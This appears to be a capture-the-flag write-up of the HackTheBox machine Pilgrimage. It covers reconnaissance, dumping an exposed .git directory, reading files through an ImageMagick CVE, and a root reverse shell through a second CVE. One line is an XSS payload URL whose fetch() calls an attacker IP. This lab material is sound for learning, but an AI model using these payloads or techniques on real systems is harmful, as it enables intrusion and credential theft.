---
title: Pilgrimage - HackTheBox
date: 2023-06-26 20:06 +0200
categories: [Easy,Linux]
tags: [pilgrimage, hackthebox]
---

![Pilgrimage](/assets/img/obsidian/Pilgrimage.png)

Hello! Today we will be tackling the machine Pilgrimage on HackTheBox. In this walk-through, we will cover the following points:

1. [Introduction to the machine](#introduction-to-the-machine)
2. [Reconnaissance and information gathering](#reconnaissance-and-information-gathering)
3. [Exploitation and gaining initial access](#exploitation-and-gaining-initial-access)
4. [Privilege escalation techniques](#privilege-escalation-techniques)
5. [Post-exploitation](#post-exploitation)
6. [Conclusion and key takeaways](#conclusion-and-key-takeaways)

Throughout this walk-through, we will be utilizing various tools and techniques to overcome challenges and progress towards rooting the machine. So, let's dive in and get started with the HackTheBox machine named Pilgrimage. Happy hacking!

## Introduction to the machine
## Reconnaissance and information gathering
First and foremost, it's important for us to understand what we will be encountering. As a standard practice, we will conduct a Nmap scan to gather information about the target and determine its current state.
```bash
[*] Extracting information...


	[*] Target Ip: 10.10.11.219

	[*] Operating system: Linux

	[*] Open ports: 22,80

	[*] Services information: 

		PORT   STATE SERVICE VERSION
		22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
		80/tcp open  http    nginx 1.18.0
```
Given that SSH and HTTP services are open, our initial focus will be on exploring the HTTP service, as SSH typically requires valid credentials for access. Therefore, we will proceed by conducting a wfuzz scan to systematically map the web directories and files, enabling us to identify any potential areas of interest or vulnerabilities.
```bash
Target: http://pilgrimage.htb/FUZZFUZ2Z
Total requests: 2205470
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00001:  C=301      7 L        11 W      169 Ch    ".git"
00012:  C=200    198 L       494 W     7620 Ch    "index - .php"
00392:  C=200    171 L       403 W     6165 Ch    "login - .php"
00512:  C=200    171 L       403 W     6172 Ch    "register - .php"
02771:  C=301      7 L        11 W      169 Ch    "assets"
12112:  C=302      0 L         0 W        0 Ch    "logout - .php"
14671:  C=301      7 L        11 W      169 Ch    "vendor"
29132:  C=302      0 L         0 W        0 Ch    "dashboard - .php"
32231:  C=301      7 L        11 W      169 Ch    "tmp"
452266:  C=403      7 L        9 W      153 Ch    ".html"
452261:  C=200    198 L      494 W     7620 Ch    "http://pilgrimage.htb/"

Total time: 0
Processed Requests: 877195
Filtered Requests: 877184
Requests/sec.: 0
```
Upon discovering the presence of a ".git" directory, we can leverage a tool called "[gitdump](https://github.com/Ebryx/GitDump)" to clone the repository and extract all the Git files stored within the directory. This will allow us to access potentially sensitive information such as commit history, configuration files, and other valuable assets that may aid in further exploration and potential exploitation.

## Exploitation and gaining initial access

During our initial interaction with the webpage, I identified the presence of a cross-site scripting (XSS) vulnerability within a specific context.
```perl
http://pilgrimage.htb/?message=%3Cspan%3E%3Cimg%20src=%22image.gif%22%20onerror=%22fetch(%27http://10.10.16.2:80%27)%22%3E%3C/span%3E&status=success 
```
However, due to the nature of the XSS vulnerability being client-side, I was unable to exploit it further or perform any significant actions beyond identifying its presence.

While searching through the dumped files obtained from the Git tool, we came across a Linux executable named `magick`, which contains the code for ImageMagick. Upon executing the code and investigating the version, we discovered that it is vulnerable to a Local File Inclusion (LFI) vulnerability, specifically [CVE-2022-44268](https://github.com/Sybil-Scan/imagemagick-lfi-poc). This vulnerability allows us to read the contents of a local file.

To exploit this vulnerability, we can craft a payload in the form of an image file (either PNG or JPEG). This file will be uploaded to the server, and when the ImageMagick `convert` command is executed on it, it will contain the encoded content of the desired file.

To simplify the process, I have developed a small script that can decode the content of a file. However, I encountered an issue when trying to decode files with unusual characters. As a workaround, I used [CyberChef](https://cyberchef.org/), an online tool, to decode the database file located at `/var/db/pilgrimage`.

After decoding the file, we discovered a password in clear text, which can be used to log in via SSH.

## Privilege escalation techniques
During our system exploration using tools like LinPeas or pspy64, we made an interesting discovery: the root user executed a script located at `/usr/sbin/malwarescan.sh`.

Additionally, we found that the script executed by root contains a binary with a vulnerable Remote Code Execution (RCE) vulnerability, specifically identified as [CVE-2022-4510](https://nvd.nist.gov/vuln/detail/CVE-2022-4510).

To exploit this vulnerability, we can download the [script](https://www.exploit-db.com/exploits/51249) and follow the provided steps to generate a malicious image. When this image is opened, it will establish a reverse shell connection to a specified host. 

Now, let's delve into the script being executed under the root context. Upon analyzing it, we determined that it searches for files within the `pilgrimage.htb/shrunk/` folder. Therefore, it's time to move our malicious image into that specific folder. Once we execute the command, we will obtain a reverse shell as the root user, granting us full control over the system.

## Post-exploitation
Now, it's time to retrieve our desired files from the compromised machine and securely copy them to our local machine. We should also ensure that we clean up any payloads or files we left behind on the victim machine to maintain proper security and avoid leaving any traces.

Furthermore, during our exploration, we attempted to discover other hosts within the private network or explore additional open ports. However, it appears that our journey with this machine has come to an end.
## Conclusion and key takeaways
The machine proved to be quite interesting as it took us back to the fundamentals of exploiting known CVEs. Initially, the foothold was a bit perplexing, but through thorough research and examining source files, we were able to uncover a clear path that led to gaining root access within the victim machine. It was a reminder of the importance of comprehensive investigation and utilizing available resources to identify vulnerabilities and achieve our objectives. Well done on successfully navigating through the exploit!